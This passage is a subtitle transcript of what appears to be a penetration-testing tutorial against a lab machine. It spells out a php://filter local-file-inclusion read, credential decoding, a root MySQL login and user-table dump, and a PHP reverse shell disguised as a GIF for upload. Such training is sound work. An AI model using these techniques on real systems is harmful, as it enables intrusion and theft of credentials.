where else,\n\n199\n00:10:45.577 --> 00:10:49.448\nmaybe something else will show\nitself as another attack factor.\n\n200\n00:10:49.448 --> 00:10:52.540\nAll right, let's see here,\nthat's not working.\n\n201\n00:10:52.540 --> 00:10:53.600\nLet's run netco.\n\n202\n00:10:53.600 --> 00:10:56.260\nNow that we've kinda kicked\nour feet around a little bit.\n\n203\n00:10:56.260 --> 00:11:00.410\nLet's see if gives us\nany good information.\n\n204\n00:11:00.410 --> 00:11:04.252\nWe'll just say nick to-h and\n\n205\n00:11:04.252 --> 00:11:10.101\nthis is 192.168.219.145.\n\n206\n00:11:10.101 --> 00:11:12.070\nFire that off.\n\n207\n00:11:12.070 --> 00:11:13.840\nLet that churn and burn.\n\n208\n00:11:13.840 --> 00:11:16.075\nI already am seeing something that I like.\n\n209\n00:11:16.075 --> 00:11:21.306\nContinue, continue, continue,\nlet me raise the subs so\n\n210\n00:11:21.306 --> 00:11:24.749\nwe can see this a little bit easier.\n\n211\n00:11:24.749 --> 00:11:26.402\nI'm just seeing good stuff here.\n\n212\n00:11:26.402 --> 00:11:28.633\nSo, yeah, yeah.\n\n213\n00:11:28.633 --> 00:11:31.281\nOne thing that I'm seeing that\nI'm already a big fan of and\n\n214\n00:11:31.281 --> 00:11:34.450\nI kinda halted on there so\nhopefully you saw it as well.\n\n215\n00:11:34.450 --> 00:11:39.860\nWas right here, /.config.php.\n\n216\n00:11:39.860 --> 00:11:43.950\nPhp config file may contain\ndatabase ID's and passwords.\n\n217\n00:11:43.950 --> 00:11:46.540\nMm, well, hey there.\n\n218\n00:11:46.540 --> 00:11:47.370\n&gt;&gt; Isn't that special.\n\n219\n00:11:47.370 --> 00:11:48.140\n&gt;&gt; How's it going?\n\n220\n00:11:48.140 --> 00:11:50.230\nRight, I'm down with that.\n\n221\n00:11:50.230 --> 00:11:52.231\nSo config.php.\n\n222\n00:11:52.231 --> 00:11:56.260\nSo let's see, let's browse to that and\nlet's see what will happen here.\n\n223\n00:11:56.260 --> 00:11:58.460\nLet me bring that back down just a bit.\n\n224\n00:11:58.460 --> 00:12:01.460\nThere we go.\n\n225\n00:12:03.590 --> 00:12:10.740\nLet's go to config.php,\nyou should take that out, config.php.\n\n226\n00:12:10.740 --> 00:12:12.710\nWow, that's exciting.\n\n227\n00:12:12.710 --> 00:12:14.540\nHold on and nothing going on there.\n\n228\n00:12:14.540 --> 00:12:17.110\nWell, obviously,\nthere's nothing displayed on the page.\n\n229\n00:12:17.110 --> 00:12:18.370\nMaybe it's in the source code, right?\n\n230\n00:12:18.370 --> 00:12:19.252\nLet's look at the source.\n\n231\n00:12:19.252 --> 00:12:22.360\nRight-click &gt; View Page Source.\n\n232\n00:12:24.060 --> 00:12:27.900\nThere's absolutely nothing in the page\nsource, so that's interesting.\n\n233\n00:12:27.900 --> 00:12:33.380\nAnd as I worked with this, I realized\nthere's a page there, it has code.\n\n234\n00:12:34.710 --> 00:12:36.540\nWhy is there nothing showing up?\n\n235\n00:12:36.540 --> 00:12:38.592\nEither there's just an empty file but\n\n236\n00:12:38.592 --> 00:12:43.430\nnet go was lending that there might be\ndatabase usernames or passwords there.\n\n237\n00:12:43.430 --> 00:12:48.210\nSo I did a little searching around and\nrealized that I found a cool technique to\n\n238\n00:12:48.210 --> 00:12:52.940\nlook for data that might be\nobfuscated by the web developers\n\n239\n00:12:52.940 --> 00:12:58.250\nthemselves where we actually\nencode the data first in base 64.\n\n240\n00:12:58.250 --> 00:13:03.190\nAnd then drop it like it's hot and see\nwhat's inside of it and you can tend to\n\n241\n00:13:03.190 --> 00:13:07.580\nfind a whole lot of interesting stuff\nthat they might have hidden from you.\n\n242\n00:13:07.580 --> 00:13:08.772\nSo it's a very cool technique.\n\n243\n00:13:08.772 --> 00:13:11.050\nI'm gonna show you how\nto do this right now.\n\n244\n00:13:11.050 --> 00:13:15.570\nIt's called PHP filter, we're going to use\na filter to run it through base 64 and\n\n245\n00:13:15.570 --> 00:13:19.640\nsee what comes out on\nthe end of the pipe there.\n\n246\n00:13:19.640 --> 00:13:23.180\nThere were a couple of other\nweb directories we saw.\n\n247\n00:13:23.180 --> 00:13:24.890\nWe saw index, we saw home.\n\n248\n00:13:24.890 --> 00:13:28.830\nWe definitely want to do this for all of\nthem because if they're doing it on one.\n\n249\n00:13:28.830 --> 00:13:31.080\nChances are they might be\ndoing it on all of them.\n\n250\n00:13:31.080 --> 00:13:35.930\nSo, wanna be thorough, that is the key to\nthis game, ladies and gentlemen, is that\n\n251\n00:13:35.930 --> 00:13:40.540\nyou look everywhere you leave no stone\nunturned because I guarantee the one thing\n\n252\n00:13:40.540 --> 00:13:46.060\nyou went, yeah, just kinda skimmed through\nthat, that's where the vulnerability lied.\n\n253\n00:13:46.060 --> 00:13:48.740\nAnd you didn't get to explore\nthe machine cuz you looked over it.\n\n254\n00:13:48.740 --> 00:13:51.270\nSo make sure you look\neverywhere you possibly can.\n\n255\n00:13:52.390 --> 00:13:53.660\nSo I'm gonna look at all of them.\n\n256\n00:13:53.660 --> 00:13:57.046\nThere was the index, and\nwe saw that in net co here.\n\n257\n00:13:57.046 --> 00:14:04.797\nWe see login.php, I think there is\nan index as well if I wasn't mistaken.\n\n258\n00:14:04.797 --> 00:14:09.925\nThere usually is anyway even\nif it's not showing up here,\n\n259\n00:14:09.925 --> 00:14:12.866\nimages is a directory not a page.\n\n260\n00:14:12.866 --> 00:14:16.490\nSo anyway I'm pretty sure\nthere's index.php as well.\n\n261\n00:14:16.490 --> 00:14:17.960\nSo let's go back here.\n\n262\n00:14:17.960 --> 00:14:21.343\nI need my prompt, actually.\n\n263\n00:14:21.343 --> 00:14:22.840\nOther prompt, please.\n\n264\n00:14:22.840 --> 00:14:25.428\nThere we go.\n\n265\n00:14:25.428 --> 00:14:29.559\nSo what we need to do is,\nit is, I was gonna use curl, but\n\n266\n00:14:29.559 --> 00:14:32.078\nI'm just gonna use the web browser.\n\n267\n00:14:32.078 --> 00:14:34.798\nI don't need to view source,\nI'm gonna just kind of wipe this out.\n\n268\n00:14:34.798 --> 00:14:41.052\nAnd what I'm gonna do is I'm gonna\nsay http:// whatever the site is,\n\n269\n00:14:41.052 --> 00:14:45.667\n.168.219.145 and then I'm gonna say,\n\n270\n00:14:45.667 --> 00:14:49.254\npage equals just like what we saw before,\n\n271\n00:14:49.254 --> 00:14:53.378\nbut this time we're gonna\nadd that PHP filter.\n\n272\n00:14:53.378 --> 00:14:59.090\nSo php://filter just like that.\n\n273\n00:14:59.090 --> 00:15:03.634\nWe're going to say,\n\n274\n00:15:03.634 --> 00:15:13.634\nconvert.base64-endcode/resource=index.\n\n275\n00:15:15.003 --> 00:15:20.348\nSo there was an index.php,\nthere was a config.php.\n\n276\n00:15:20.348 --> 00:15:22.680\nLet's do that one first, right?\n\n277\n00:15:22.680 --> 00:15:25.049\nWell, let's just do this one,\nsee what comes up.\n\n278\n00:15:25.049 --> 00:15:27.836\nHoly cow, now we get a little interesting.\n\n279\n00:15:27.836 --> 00:15:30.907\nSo this is that base64\nencoded information that we\n\n280\n00:15:30.907 --> 00:15:33.849\ndidn't see normally when\nwe did a right-click.\n\n281\n00:15:33.849 --> 00:15:35.950\nAnd so\nit just kinda gave us the source code.\n\n282\n00:15:35.950 --> 00:15:39.910\nSo if we were doing index,\nlet me show you that.\n\n283\n00:15:39.910 --> 00:15:45.785\n192.196.802.145/index.php and\n\n284\n00:15:45.785 --> 00:15:51.010\nwe did a right click on\nthis in View Page Source.\n\n285\n00:15:52.030 --> 00:15:56.130\nThat's all we get, we don't see that so\nthere's some hidden data there.\n\n286\n00:15:56.130 --> 00:15:59.572\nWe found that using that\nbase 64 encoding process.\n\n287\n00:15:59.572 --> 00:16:03.290\nSo there it is,\nnow we have to do is decoding Easy, right?\n\n288\n00:16:03.290 --> 00:16:05.073\n&gt;&gt; Yeah, [LAUGH], nothing to it, right?\n\n289\n00:16:05.073 --> 00:16:07.553\nJust slip a little Python.\n\n290\n00:16:07.553 --> 00:16:09.712\nActually it is not that difficult.\n\n291\n00:16:09.712 --> 00:16:13.083\nI'm gonna show you a very cool method for\ndoing this here.\n\n292\n00:16:13.083 --> 00:16:15.352\nThere's a couple ways actually,\nand they're all really cool.\n\n293\n00:16:15.352 --> 00:16:20.320\nSo I'm just gonna copy that string,\nand then first, the easy way.\n\n294\n00:16:20.320 --> 00:16:24.590\nYou see this little browser\nbar I have installed here?\n\n295\n00:16:24.590 --> 00:16:26.487\nThat's HackBar.\n\n296\n00:16:26.487 --> 00:16:29.517\nSo run out, grab HackBar,\ninstall it on your machine.\n\n297\n00:16:29.517 --> 00:16:32.313\nIt's got great tools in it, great tools.\n\n298\n00:16:32.313 --> 00:16:33.280\nIt's a fantastic thing.\n\n299\n00:16:34.780 --> 00:16:36.870\nI'm gonna go to this encryption area.\n\n300\n00:16:36.870 --> 00:16:38.246\nI'm sorry, encoding.\n\n301\n00:16:38.246 --> 00:16:40.526\nI'm gonna say base 64 decode.\n\n302\n00:16:40.526 --> 00:16:43.323\nIt's gonna ask me what was the string\nthat I would like to decode.\n\n303\n00:16:43.323 --> 00:16:45.038\nCopy and paste.\n\n304\n00:16:45.038 --> 00:16:53.102\nHit OK, and\nthere is the decoded base 64 information.\n\n305\n00:16:53.102 --> 00:16:57.753\nSo we're getting information out of here,\na lot of good information.\n\n306\n00:16:57.753 --> 00:17:01.230\nI'm actually seeing some information\nthat I like right here at the top.\n\n307\n00:17:01.230 --> 00:17:02.716\nI like this.\n\n308\n00:17:02.716 --> 00:17:06.224\nYou see the set cookie, LAN, PM, LAN php.\n\n309\n00:17:06.224 --> 00:17:11.534\nIt this set cookie lan,\nlet me have the lan here.\n\n310\n00:17:11.534 --> 00:17:14.462\nThis whole block of code.\n\n311\n00:17:14.462 --> 00:17:15.445\nMike, I don't know if you can see that.\n\n312\n00:17:15.445 --> 00:17:16.747\nWhat does that say right there?\n\n313\n00:17:16.747 --> 00:17:18.535\n&gt;&gt; That looks like like the word include.\n\n314\n00:17:18.535 --> 00:17:20.277\n&gt;&gt; Yeah, it does, doesn't it?\n\n315\n00:17:20.277 --> 00:17:25.358\n&gt;&gt; It's including a cookie\nvalue of some sort right here.\n\n316\n00:17:25.358 --> 00:17:27.790\nThat's definitely, that's good stuff.\n\n317\n00:17:27.790 --> 00:17:30.660\nThat means we might have\nLFI through that means.\n\n318\n00:17:30.660 --> 00:17:34.340\nSo we couldn't do it before through\nthe browser URL, maybe we can go through\n\n319\n00:17:34.340 --> 00:17:39.020\nthe backdoor here, and use this\ninclude that we have available to us.\n\n320\n00:17:39.020 --> 00:17:41.928\nSo we'll keep that on the back burner for\nright this second.\n\n321\n00:17:41.928 --> 00:17:43.180\nI wanna show you something else.\n\n322\n00:17:43.180 --> 00:17:46.030\nCuz remember, that config.php is set,\nthere might be usernames and\n\n323\n00:17:46.030 --> 00:17:47.380\npasswords in there.\n\n324\n00:17:47.380 --> 00:17:50.077\nYou think if we ran this in code thing-\n&gt;&gt; Let's try it.\n\n325\n00:17:50.077 --> 00:17:52.010\n&gt;&gt; That we might find\nsomething interesting?\n\n326\n00:17:53.190 --> 00:17:55.727\nLet's try config.\n\n327\n00:17:55.727 --> 00:17:58.120\nHey, there's another string of data.\n\n328\n00:17:58.120 --> 00:18:00.575\nLet's copy that.\n\n329\n00:18:00.575 --> 00:18:02.640\nCopy, let's run it through.\n\n330\n00:18:02.640 --> 00:18:04.440\nI'll show you a different way\nto decode this thing, right?\n\n331\n00:18:04.440 --> 00:18:07.469\nWe'll bring up our terminal and\nyou can do it like this.\n\n332\n00:18:07.469 --> 00:18:13.376\nYou can say echo and then paste that in,\n\n333\n00:18:13.376 --> 00:18:20.367\nand then type that into base 64 --decode.\n\n334\n00:18:22.830 --> 00:18:24.359\nHey, what's that, Mike?\n\n335\n00:18:24.359 --> 00:18:26.712\n&gt;&gt; Those [LAUGH] look like usernames and\npasswords to me.\n\n336\n00:18:26.712 --> 00:18:28.142\n&gt;&gt; [LAUGH] Yes, it does, doesn't it?\n\n337\n00:18:28.142 --> 00:18:29.480\n&gt;&gt; I believe Nitko was correct.\n\n338\n00:18:29.480 --> 00:18:33.010\n&gt;&gt; You know, unlike one\nSamuel L Jackson in Jurassic Park,\n\n339\n00:18:33.010 --> 00:18:35.121\nI love this hacker's crap.\n\n340\n00:18:35.121 --> 00:18:36.169\n[LAUGH] This is fun.\n\n341\n00:18:36.169 --> 00:18:37.021\nIt is a good time.\n\n342\n00:18:37.021 --> 00:18:38.360\nLook at that there.\n\n343\n00:18:38.360 --> 00:18:41.440\nSo I've got a server,\nI've got a user name, route,\n\n344\n00:18:41.440 --> 00:18:44.020\nand a password, right then and there.\n\n345\n00:18:44.020 --> 00:18:45.470\nWell, that is an interesting thing.\n\n346\n00:18:47.170 --> 00:18:49.250\nHey, I remember when we\nwere running our Nmap scan.\n\n347\n00:18:49.250 --> 00:18:52.555\nWasn't there a SQL Server\nremote port open?\n\n348\n00:18:52.555 --> 00:18:53.458\n&gt;&gt; There was.\n\n349\n00:18:53.458 --> 00:18:56.570\n&gt;&gt; [LAUGH] Let's see if we can't log\ninto that using these credentials.\n\n350\n00:18:56.570 --> 00:18:58.092\nI wonder if that'll work.\n\n351\n00:18:58.092 --> 00:19:00.700\nLet's get our little thing going here.\n\n352\n00:19:02.580 --> 00:19:08.840\nAnd we will say, let me get, so I can say,\nfollow my notes just perfectly here.\n\n353\n00:19:08.840 --> 00:19:14.686\nSo MySQL, this is how you log in remotely,\n-u root was the name.\n\n354\n00:19:14.686 --> 00:19:17.045\nI wanna say -p so\nit prompts me for a password.\n\n355\n00:19:17.045 --> 00:19:19.212\nI'm not gonna actually put\nthe password in the string.\n\n356\n00:19:19.212 --> 00:19:21.809\nI want it to prompt me for it.\n\n357\n00:19:21.809 --> 00:19:23.495\nThen -h, what's the host?\n\n358\n00:19:23.495 --> 00:19:27.310\n192.168.219.145, and\n\n359\n00:19:27.310 --> 00:19:31.344\nthen hit return, asks me for the password.\n\n360\n00:19:31.344 --> 00:19:36.515\nI will copy and\npaste that monkey right here,\n\n361\n00:19:36.515 --> 00:19:40.090\ncopy, paste, hit return.\n\n362\n00:19:40.090 --> 00:19:41.680\nAnd look at that, it's a MySQL prompt.\n\n363\n00:19:41.680 --> 00:19:45.900\nI am logged into the SQL Server right now,\nas root, by the way.\n\n364\n00:19:45.900 --> 00:19:47.650\nAs root, by the way, just FYI on that one.\n\n365\n00:19:47.650 --> 00:19:49.238\n&gt;&gt; And done,\nforget the local file includes.\n\n366\n00:19:49.238 --> 00:19:53.194\n[LAUGH] I mean, I'm in their database,\nwhat more do I need?\n\n367\n00:19:53.194 --> 00:19:55.800\n&gt;&gt; Yeah, you can definitely have some\nfun at this point in time, right?\n\n368\n00:19:55.800 --> 00:19:57.877\nBut we're going for that web server.\n\n369\n00:19:57.877 --> 00:20:01.170\nWe want real root access,\nnot just access to their database per se.\n\n370\n00:20:01.170 --> 00:20:03.880\n&gt;&gt; Well, Daniel, I remember when\nwe first browsed that website,\n\n371\n00:20:03.880 --> 00:20:06.550\nwe had a couple of links up top,\nUpload was nice.\n\n372\n00:20:06.550 --> 00:20:07.420\nWe had a Homelink.\n\n373\n00:20:07.420 --> 00:20:09.390\nWe also had one that said Login.\n\n374\n00:20:09.390 --> 00:20:10.440\n&gt;&gt; That's correct.\n\n375\n00:20:10.440 --> 00:20:12.140\nI wonder if these login\ncredentials will work there?\n\n376\n00:20:13.240 --> 00:20:14.310\nIt's worth giving it a shot, right?\n\n377\n00:20:14.310 --> 00:20:15.190\nLet's give that a shot.\n\n378\n00:20:16.260 --> 00:20:20.551\nSo let's go to Login, and it was root.\n\n379\n00:20:20.551 --> 00:20:24.579\nI should still have that copied to\nthe clipboard, just Paste that in there.\n\n380\n00:20:24.579 --> 00:20:27.521\nHit Login, [SOUND].\n\n381\n00:20:27.521 --> 00:20:28.302\n&gt;&gt; That would have been too easy, right?\n\n382\n00:20:28.302 --> 00:20:29.901\n&gt;&gt; Yeah,\nthat would have been awesome, right?\n\n383\n00:20:29.901 --> 00:20:31.076\n&gt;&gt; [LAUGH]\n&gt;&gt; But as Nitko said,\n\n384\n00:20:31.076 --> 00:20:34.839\nit said it might have been database\ncredentials, so it was worth a shot,\n\n385\n00:20:34.839 --> 00:20:36.455\ndefinitely try those things.\n\n386\n00:20:36.455 --> 00:20:37.904\nDon't, just because it didn't work here\ndoesn't mean you shouldn't try it.\n\n387\n00:20:37.904 --> 00:20:41.412\n&gt;&gt; Because administrators never use\nthe same password in more than one place.\n\n388\n00:20:41.412 --> 00:20:42.367\n&gt;&gt; No, it never happens.\n&gt;&gt; Never.\n\n389\n00:20:42.367 --> 00:20:43.084\n&gt;&gt; No, no.\n\n390\n00:20:43.084 --> 00:20:45.894\n&gt;&gt; [LAUGH]\n&gt;&gt; Wrong, so it didn't work here, so\n\n391\n00:20:45.894 --> 00:20:47.180\nthat's cool.\n\n392\n00:20:47.180 --> 00:20:48.500\nLet's go back to our database.\n\n393\n00:20:49.950 --> 00:20:53.270\nI will lift this up just a hair for\nyou guys.\n\n394\n00:20:53.270 --> 00:20:56.700\nAnd let's mess around\nwith this thing here.\n\n395\n00:20:56.700 --> 00:21:00.563\nSo let's just show databases.\n\n396\n00:21:00.563 --> 00:21:01.678\nLittle transact SQL.\n\n397\n00:21:01.678 --> 00:21:05.427\nSo we only have two, or we got\nthe information schema, and one database,\n\n398\n00:21:05.427 --> 00:21:06.800\nwhich is users.\n\n399\n00:21:06.800 --> 00:21:09.302\nSo we will use users.\n\n400\n00:21:11.034 --> 00:21:14.542\nSo our database has changed,\nand I'll say show tables.\n\n401\n00:21:14.542 --> 00:21:15.960\nSee the table\u007fs inside of it.\n\n402\n00:21:15.960 --> 00:21:18.500\nGreat only one table there, easy enough.\n\n403\n00:21:18.500 --> 00:21:24.007\nSo we will say select * from users,\n\n404\n00:21:24.007 --> 00:21:28.970\ndon't forget your semicolon.\n\n405\n00:21:28.970 --> 00:21:31.028\nHey, hey, hey, what is this?\n\n406\n00:21:31.028 --> 00:21:33.626\n&gt;&gt; More and more usernames and passwords.\n\n407\n00:21:33.626 --> 00:21:35.774\n&gt;&gt; So this is getting great,\nright, I'm loving this.\n\n408\n00:21:35.774 --> 00:21:37.520\nSo I've got three usernames and passwords.\n\n409\n00:21:37.520 --> 00:21:40.579\nWe can copy that and\npaste that out into a file if we like.\n\n410\n00:21:40.579 --> 00:21:44.392\nI think I've already actually done that,\nbut look at these passwords.\n\n411\n00:21:44.392 --> 00:21:48.144\nYou might wanna know, how did I know about\nlike that string that that was Base64?\n\n412\n00:21:48.144 --> 00:21:51.660\nA, because I encoded it in Base64,\nso I knew to decode there.\n\n413\n00:21:51.660 --> 00:21:56.150\nBut also typically if you see something\nthat looks like it's encoded,\n\n414\n00:21:56.150 --> 00:21:59.940\nyou start to get a feel for these things.\n\n415\n00:21:59.940 --> 00:22:03.580\nThese double equal signs on\nthe end are a telltale sign\n\n416\n00:22:03.580 --> 00:22:07.120\nthat this is a Base64 encoded string.\n\n417\n00:22:07.120 --> 00:22:10.421\nSo we have passwords but\nthey're encoded in Base64.\n\n418\n00:22:10.421 --> 00:22:13.030\nWe've got a list of usernames,\nthat's great, that's not encoded.\n\n419\n00:22:13.030 --> 00:22:17.610\nSo now we just have to run these guys\nback through our processor here and\n\n420\n00:22:17.610 --> 00:22:20.970\ndecode these things,\nwhich was easy enough done.\n\n421\n00:22:20.970 --> 00:22:23.330\nLet me make sure I actually\ncopied that stuff.\n\n422\n00:22:23.330 --> 00:22:25.925\nI'm pretty sure I did in here.\n\n423\n00:22:25.925 --> 00:22:27.220\nLet me see here.\n\n424\n00:22:27.220 --> 00:22:28.120\nYeah, there it is.\n\n425\n00:22:28.120 --> 00:22:31.620\nCat, MySQL users, and there it was.\n\n426\n00:22:31.620 --> 00:22:34.020\nSo I've already actually done\nthe process of decoding them.\n\n427\n00:22:34.020 --> 00:22:36.480\nWe saw that using the Pipebase 64.\n\n428\n00:22:36.480 --> 00:22:38.830\nLet me show you how to do it with Python.\n\n429\n00:22:38.830 --> 00:22:43.452\nJust so you have another, another way\nto do this, another way to do this,\n\n430\n00:22:43.452 --> 00:22:44.508\nreally simple.\n\n431\n00:22:44.508 --> 00:22:47.640\nMove this back out of the way,\nI don't wanna, yeah, there it is.\n\n432\n00:22:47.640 --> 00:22:50.716\nI can't, I'm horrible about\nremembering my Python commands.\n\n433\n00:22:50.716 --> 00:22:57.328\nSo let me exit out,\nI'll say python -m base64 and\n\n434\n00:22:57.328 --> 00:23:04.089\nthen -d for decode, and\nthen three less than signs,\n\n435\n00:23:04.089 --> 00:23:08.461\na space and whatever the value is.\n\n436\n00:23:08.461 --> 00:23:13.753\nSo I need to come over here and\njust copy the value,\n\n437\n00:23:13.753 --> 00:23:17.660\npaste it into there and there you go.\n\n438\n00:23:19.630 --> 00:23:20.660\nThere's the string.\n\n439\n00:23:20.660 --> 00:23:23.518\nAnd as you can see,\nthat's what I got right there.\n\n440\n00:23:23.518 --> 00:23:27.870\nSo I just did all three of those, so now I\nhave the actual user names and passwords.\n\n441\n00:23:27.870 --> 00:23:31.290\nNow it is a bunch of jumbled mess, so\nyou might think maybe it's double encoded.\n\n442\n00:23:31.290 --> 00:23:34.439\nMaybe that's a MD5 hash or\nsome other hashing.\n\n443\n00:23:34.439 --> 00:23:38.160\nYou can try to run it through a different\nhashing or you can just try those.\n\n444\n00:23:38.160 --> 00:23:44.379\nFirst, do the easy things first before you\ntrudge along to something more difficult.\n\n445\n00:23:44.379 --> 00:23:47.756\nTry the easy thing first,\ncuz it's always the easy thing first.\n\n446\n00:23:47.756 --> 00:23:51.378\nYou just don't wanna spend hours at a time\ndoing something hard just to realize,\n\n447\n00:23:51.378 --> 00:23:53.590\nI could have just logged in with this.\n\n448\n00:23:53.590 --> 00:23:57.307\nSo let's try that, we've got Kent,\nMike and Cane, different passwords.\n\n449\n00:23:57.307 --> 00:24:02.365\nOpen up our browser,\ngo to the log in area My name is Kent.\n\n450\n00:24:02.365 --> 00:24:05.713\nMy password is,\n\n451\n00:24:05.713 --> 00:24:10.740\ncopy that, paste it in.\n\n452\n00:24:10.740 --> 00:24:14.290\nLog in, ho, ho, ho,\nwe are logged in the system.\n\n453\n00:24:14.290 --> 00:24:17.180\nThat is a gravy train right\nthere if I ever saw it.\n\n454\n00:24:17.180 --> 00:24:18.001\nI'm going to close this.\n\n455\n00:24:18.001 --> 00:24:20.880\nI'm going to be sure and remember this,\nbut now, what do I have the option to do?\n\n456\n00:24:20.880 --> 00:24:23.760\nI have the option to\nupload a file basically\n\n457\n00:24:23.760 --> 00:24:26.360\nis where it took me cuz you can see\nright here, now the page=upload.\n\n458\n00:24:26.360 --> 00:24:31.060\nIt redirected me to the upload page\nas soon as I logged in, very good.\n\n459\n00:24:31.060 --> 00:24:36.410\nHey, I have a really cool thing\nthat we had from our RFI A PHP\n\n460\n00:24:36.410 --> 00:24:39.710\nreverse shell, and\nI'm gonna upload that file right now.\n\n461\n00:24:39.710 --> 00:24:43.770\nAll right, so let's browse to that.\n\n462\n00:24:43.770 --> 00:24:45.650\nThere it is,\nI don't know what firm number.\n\n463\n00:24:45.650 --> 00:24:48.330\nThat's why I wrote these things down,\nso right out of the shell.\n\n464\n00:24:48.330 --> 00:24:50.710\nYeah, Shell, not Shell2.\n\n465\n00:24:50.710 --> 00:24:52.622\nI must have been playing\naround different stuff.\n\n466\n00:24:52.622 --> 00:24:58.578\nOpen that and I hit Upload,\nand there it is.\n\n467\n00:24:58.578 --> 00:25:02.205\nNow that would work, I cannot jump over.\n\n468\n00:25:02.205 --> 00:25:04.913\nLet me go back,\nlet me show you something really quickly.\n\n469\n00:25:04.913 --> 00:25:09.216\nLet me try this path.\n\n470\n00:25:09.216 --> 00:25:12.434\nHere we go, php.vershell.php,\n\n471\n00:25:12.434 --> 00:25:17.490\nthe actual shell file,\nlet me open that and hit Upload.\n\n472\n00:25:17.490 --> 00:25:22.071\nIt knows that not allowed extension,\nplease upload images only.\n\n473\n00:25:22.071 --> 00:25:26.524\nSo, my PHP reverse shell as\nit were is not gonna upload.\n\n474\n00:25:26.524 --> 00:25:29.140\nThat's why I had that shell.gif,\nyou'll notice it was a .gif.\n\n475\n00:25:29.140 --> 00:25:31.220\nLet me show you what I did there.\n\n476\n00:25:31.220 --> 00:25:33.920\nA little Tarantinoing for\nyou, kinda jumped ahead.\n\n477\n00:25:33.920 --> 00:25:35.709\nWe're gonna go back and\nsee how that worked.\n\n478\n00:25:36.920 --> 00:25:44.430\nWhat I did was is if I look in here ls,\nthere's php-reverse-shell right there so\n\n479\n00:25:44.430 --> 00:25:49.470\nI just copied it and called it shell.gif\nand Linux can do that kind of thing,\n\n480\n00:25:49.470 --> 00:25:54.908\nyou can do that on Windows too but\nif I just say copy php-reverse-shell dot.\n\n481\n00:25:54.908 --> 00:25:58.880\nPHP to shell.gif it doesn't care that\n\n482\n00:25:58.880 --> 00:26:03.604\nit's called .gif what I did\nhave to do was is if I,\n\n483\n00:26:03.604 --> 00:26:08.791\nwe had shell.gif,\n\n484\n00:26:08.791 --> 00:26:11.910\nthere we go.\n\n485\n00:26:11.910 --> 00:26:13.230\nSee this right here?\n\n486\n00:26:13.230 --> 00:26:15.010\nSo this is my PHP.\n\n487\n00:26:15.010 --> 00:26:17.350\nStuff normal every day php code.\n\n488\n00:26:17.350 --> 00:26:21.460\nBut the very first line,\nI had to add this gif 98,\n\n489\n00:26:21.460 --> 00:26:26.270\nand that basically fools the system\ninto believing this is a gif.\n\n490\n00:26:26.270 --> 00:26:28.520\nBy just adding that line to there.\n\n491\n00:26:28.520 --> 00:26:31.330\nSo I was met with a little\nbit of sanitation.\n\n492\n00:26:31.330 --> 00:26:34.260\nIt says you can only\nupload image type files.\n\n493\n00:26:34.260 --> 00:26:38.080\nJpegs and things of that nature\nWith a to create a GIF super easy.\n\n494\n00:26:38.080 --> 00:26:40.580\nAdd gif 98 to the very first line.\n\n495\n00:26:40.580 --> 00:26:43.520\n&gt;&gt; Just changing the extension wouldn't be\nenough cuz it's gonna look at that first\n\n496\n00:26:43.520 --> 00:26:46.100\nline and go, wait this is isn't a GIF,\nI can't, this isn't an image.\n\n497\n00:26:46.100 --> 00:26:47.880\n&gt;&gt; Exactly.\n&gt;&gt; But adding that line tricks it.\n\n498\n00:26:47.880 --> 00:26:48.500\n&gt;&gt; You nailed it.\n\n499\n00:26:48.500 --> 00:26:49.840\nMike gold star yet again.\n\n500\n00:26:49.840 --> 00:26:52.370\nHe's our star pupil here.\n\n501\n00:26:52.370 --> 00:26:53.900\nSo that's gonna help us now.\n\n502\n00:26:53.900 --> 00:26:57.950\nWe can upload our file which we\nare ready to do So, we chose that.\n\n503\n00:26:57.950 --> 00:27:00.900\nLet's go back to, let's just do that.\n\n504\n00:27:00.900 --> 00:27:06.270\nBrowse, upload shell gif,\nopen and hit upload.\n\n505\n00:27:06.270 --> 00:27:09.910\nSo, now what we need to do is find out\nwhere the heck did that file get saved.\n\n506\n00:27:09.910 --> 00:27:12.260\nCool thing is,\nthat's a pretty easy process.\n\n507\n00:27:12.260 --> 00:27:17.485\nThere's a broken little gif Icon concerns,\nthere's no picture data here.\n\n508\n00:27:17.485 --> 00:27:18.990\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know you say it's\n\n509\n00:27:18.990 --> 00:27:21.490\na GIF I guess it's a GIF but\nthere's nothing there for me to display so\n\n510\n00:27:21.490 --> 00:27:26.880\nI'll just put the little broken GIF thing,\njust right click and view or\n\n511\n00:27:26.880 --> 00:27:31.930\ncopy, where is it yeah, view image.\n\n512\n00:27:31.930 --> 00:27:35.730\nAnd the image and look at that,\nthere is the actual.\n\n513\n00:27:35.730 --> 00:27:37.730\nURL to that.\n\n514\n00:27:37.730 --> 00:27:39.840\nThis is, cannot be displayed\nbecause it contains errors.\n\n515\n00:27:39.840 --> 00:27:40.510\nThat's fine.\n\n516\n00:27:40.510 --> 00:27:41.400\nI don't care.\n\n517\n00:27:41.400 --> 00:27:43.900\nAll I want to know is,\nwhere the heck is that thing?\n\n518\n00:27:43.900 --> 00:27:47.970\nIt's in upload and this is the file name,\ndot gift that it saved it in.\n\n519\n00:27:47.970 --> 00:27:51.240\nI'm just going to save\nthat upload portion.\n\n520\n00:27:51.240 --> 00:27:52.640\nNo, I'm not.\n\n521\n00:27:52.640 --> 00:27:55.050\nIf I can.\nIt's not allowing me.\n\n522\n00:27:55.050 --> 00:27:55.800\nSo, great for you.\n\n523\n00:27:55.800 --> 00:27:57.340\nI can do it with curl or\nsomething like that.\n\n524\n00:27:57.340 --> 00:27:57.970\nI was just.\n\n525\n00:27:57.970 --> 00:28:00.005\nJust get that, just copy it with your.\n\n526\n00:28:00.005 --> 00:28:05.140\n[LAUGH] How about I copy\nit out of the actual URL?\n\n527\n00:28:05.140 --> 00:28:06.670\nThat could be easy.\n\n528\n00:28:06.670 --> 00:28:07.780\nCopy that.\n\n529\n00:28:07.780 --> 00:28:08.705\nCopy that, ghost leader.\n\n530\n00:28:08.705 --> 00:28:09.560\n&gt;&gt; [LAUGH]\n&gt;&gt; Now we're off.\n\n531\n00:28:09.560 --> 00:28:11.060\nI actually now have that.\n\n532\n00:28:11.060 --> 00:28:13.980\nSo, now we're gonna go back to,\nremember when we looked at index and\n\n533\n00:28:13.980 --> 00:28:15.870\nthere was that include?\n\n534\n00:28:15.870 --> 00:28:18.430\nMaybe I can include this file,\ncuz that's what we're doing.\n\n535\n00:28:18.430 --> 00:28:21.020\nI want you to include a local file.\n\n536\n00:28:21.020 --> 00:28:21.690\nGuess what?\n\n537\n00:28:21.690 --> 00:28:24.980\nOur php.gif thing is now\na local file on machine, 